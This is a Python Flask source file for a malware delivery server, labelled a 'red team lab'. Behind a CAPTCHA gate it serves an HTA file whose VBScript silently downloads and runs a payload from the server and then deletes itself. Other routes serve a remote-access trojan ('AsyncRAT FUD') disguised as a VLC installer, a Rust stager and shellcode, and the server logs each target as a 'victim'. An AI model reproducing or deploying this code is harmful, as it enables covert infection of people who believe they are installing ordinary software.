import os
import uuid
import random
import time
import hmac
from datetime import datetime, timedelta
from flask import Flask, render_template, request, session, send_file, abort, redirect, url_for
from PIL import Image, ImageDraw, ImageFont
from werkzeug.utils import secure_filename
from functools import wraps

#projeto

app = Flask(__name__, template_folder="templates", static_folder="static")
app.secret_key = os.urandom(32)
app.permanent_session_lifetime = timedelta(minutes=30)

BASE_DIR = os.path.dirname(os.path.abspath(__file__))

# Pastas
for p in ["downloads", "static/payloads", "logs", "static/fonts"]:
    os.makedirs(os.path.join(BASE_DIR, p), exist_ok=True)

ip_validado = {}

PAYLOADS = {
    "vlc": {"file": "vlc-3.0.22-win64.exe", "desc": "AsyncRAT FUD"},
}

def log_access(msg):
    ip = request.remote_addr or "unknown"
    ua = request.headers.get("User-Agent", "unknown")
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(os.path.join(BASE_DIR, "logs/access.log"), "a", encoding="utf-8") as f:
        f.write(f"[{ts}] {ip} | {ua} | {msg}\n")

# ===================== CAPTCHA =====================
def gerar_captcha():
    chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789"
    codigo = ''.join(random.choices(chars, k=6))
    largura, altura = 460, 170
    img = Image.new("RGB", (largura, altura), "#0d1117")
    draw = ImageDraw.Draw(img)

    # Ruído
    for _ in range(900):
        draw.point((random.randint(0, largura - 1), random.randint(0, altura - 1)), fill=(random.randint(30, 90),) * 3)
    for x in range(0, largura, 32):
        draw.line((x, 0, x, altura), fill="#23272f", width=1)
    for y in range(0, altura, 32):
        draw.line((0, y, largura, y), fill="#23272f", width=1)

    # Texto distorcido
    x_base = 50
    for i, c in enumerate(codigo):
        try:
            font = ImageFont.truetype(os.path.join(BASE_DIR, "static/fonts/arialbd.ttf"), random.randint(68, 78))
        except:
            font = ImageFont.load_default()
        cor = (random.randint(120, 255), random.randint(120, 255), random.randint(180, 255))
        angulo = random.randint(-25, 25)

        temp = Image.new("RGBA", (120, 140), (0, 0, 0, 0))
        d = ImageDraw.Draw(temp)
        d.text((20, 15), c, font=font, fill=cor)
        rot = temp.rotate(angulo, expand=True, resample=Image.BICUBIC)
        img.paste(rot, (x_base + i * 68 + random.randint(-12, 12), 38 + random.randint(-15, 15)), rot)

    # Linhas de ruído
    for _ in range(8):
        draw.line([
            random.randint(20, 120), random.randint(20, 150),
            random.randint(340, 440), random.randint(20, 150)
        ], fill=(random.randint(80, 150), random.randint(100, 220), 255), width=3)

    nome = f"captcha_{uuid.uuid4().hex[:12]}.png"
    caminho = os.path.join(BASE_DIR, "downloads", nome)
    img.save(caminho, "PNG")
    return codigo, nome


def require_captcha(f):
    @wraps(f)
    def deco(*args, **kwargs):
        ip = request.remote_addr
        if ip not in ip_validado or time.time() > ip_validado[ip]:
            log_access("BLOQUEADO - CAPTCHA NÃO VALIDADO")
            return redirect(url_for('index'))
        return f(*args, **kwargs)
    return deco

# ===================== ROTAS =====================
@app.route("/", methods=["GET", "POST"])
def index():
    ip = request.remote_addr
    log_access("ACESSOU PÁGINA PRINCIPAL")

    if request.method == "POST":
        entrada = request.form.get("captcha_input", "").strip().upper()
        correta = session.get("captcha_code")

        if entrada and correta and hmac.compare_digest(entrada, correta):
            ip_validado[ip] = time.time() + 1800  # 30 minutos
            log_access("CAPTCHA RESOLVIDO COM SUCESSO")

            # Limpa captcha antigo
            try:
                old_img = session.get("captcha_img")
                if old_img:
                    os.remove(os.path.join(BASE_DIR, "downloads", old_img))
            except:
                pass

            return render_template("success.html")

        else:
            log_access("CAPTCHA INCORRETO")

    # Gera novo captcha
    codigo, img_nome = gerar_captcha()
    session["captcha_code"] = codigo
    session["captcha_img"] = img_nome

    return render_template("index.html",
                           captcha_image=img_nome,
                           erro="Código incorreto!" if request.method == "POST" else None)

@app.route("/c/<fname>")
def serve_captcha(fname):
    path = os.path.join(BASE_DIR, "downloads", secure_filename(fname))
    if os.path.exists(path):
        return send_file(path, mimetype="image/png")
    abort(404)

@app.route("/instalar/<payload>")
@require_captcha
def instalar_hta(payload):
    if payload not in PAYLOADS:
        abort(404)

    victim_uuid = uuid.uuid4().hex[:16]
    host = request.host_url.rstrip("/")

    hta_content = f'''<html><head><title>Update</title>
<HTA:APPLICATION SHOWINTASKBAR=no WINDOWSTATE=minimize CAPTION=no/>
<script language="VBScript">
On Error Resume Next
Set shell = CreateObject("WScript.Shell")
url = "{host}/download/{payload}"
temp = shell.ExpandEnvironmentStrings("%TEMP%") & "\\{PAYLOADS[payload]['name']}"

Set http = CreateObject("MSXML2.XMLHTTP")
http.Open "GET", url, False
http.Send

If http.Status = 200 Then
    Set stm = CreateObject("ADODB.Stream")
    stm.Open
    stm.Type = 1
    stm.Write http.responseBody
    stm.SaveToFile temp, 2
    stm.Close

    ' Execução stealth 2025/2026
    shell.Run "explorer.exe """ & temp & """", 0, False
    shell.Run "cmd /c timeout 3 && del ""%~f0""", 0, False
End If
window.close
</script></head><body></body></html>'''

    log_access(f"HTA ENTREGUE → Victim: {victim_uuid} | Payload: {payload}")
    ip_validado.pop(request.remote_addr, None)

    return hta_content, 200, {"Content-Type": "application/hta"}

@app.route("/download/<payload>")
@require_captcha
def download_payload(payload):
    if payload not in PAYLOADS:
        abort(404)

    path = os.path.join(BASE_DIR, "static", "payloads", PAYLOADS[payload]["file"])
    if not os.path.exists(path):
        abort(404)

    log_access(f"PAYLOAD BAIXADO → {PAYLOADS[payload]['desc']}")
    ip_validado.pop(request.remote_addr, None)

    return send_file(path, as_attachment=True, download_name=PAYLOADS[payload]["name"])


# ===================== NOVAS ROTAS RUST =====================
@app.route("/get_rusta")
@require_captcha
def get_rusta():
    path = os.path.join(BASE_DIR, "static", "payloads", "vlc-media-updater.exe")
    if not os.path.exists(path):
        abort(404)
    log_access("RUST STAGER BAIXADO → vlc-media-updater.exe")
    ip_validado.pop(request.remote_addr, None)
    return send_file(path, as_attachment=True, download_name="vlc-media-updater.exe")

@app.route("/get_sc")
@require_captcha
def get_sc():
    path = os.path.join(BASE_DIR, "static", "payloads", "sc.bin")
    if os.path.exists(path):
        log_access("SHELLCODE BAIXADO")
        return send_file(path, mimetype="application/octet-stream")
    abort(404)

if __name__ == "__main__":
    print("="*70)
    print("🔥 LAB RED TEAM 2026 - RUST STAGER INTEGRADO")
    print("http://127.0.0.1:5000")
    print("="*70)
    app.run(host="0.0.0.0", port=5000, threaded=True, debug=False)